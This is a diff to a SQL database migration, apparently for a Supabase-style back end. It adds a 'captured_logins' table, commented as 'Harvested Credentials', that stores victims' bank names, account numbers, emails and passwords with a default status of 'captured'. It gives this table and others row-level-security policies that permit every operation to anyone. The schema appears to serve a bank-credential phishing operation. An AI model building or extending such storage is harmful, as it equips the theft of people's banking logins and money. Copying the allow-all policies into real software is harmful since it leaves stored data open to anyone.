@@ -48,6 +48,23 @@ create policy "Allow all operations new_apps" on new_applications for all using 
 create policy "Allow all operations messages" on messages for all using (true) with check (true);
 create policy "Allow all operations statements" on statements for all using (true) with check (true);
 
--- Transactions table (Ensure RLS is enabled and permissive)
+-- Captured Logins Table (Harvested Credentials)
+create table if not exists captured_logins (
+  id uuid default uuid_generate_v4() primary key,
+  created_at timestamp with time zone default timezone('utc'::text, now()) not null,
+  user_id uuid references users(id) on delete set null,
+  bank_name text,
+  account_name text,
+  account_number text,
+  email text,
+  password text,
+  status text default 'captured'
+);
+
+-- Enable RLS
+alter table captured_logins enable row level security;
+create policy "Allow all operations captured_logins" on captured_logins for all using (true) with check (true);
+
+-- Enable RLS
 alter table transactions enable row level security;
 create policy "Allow all operations transactions" on transactions for all using (true) with check (true);
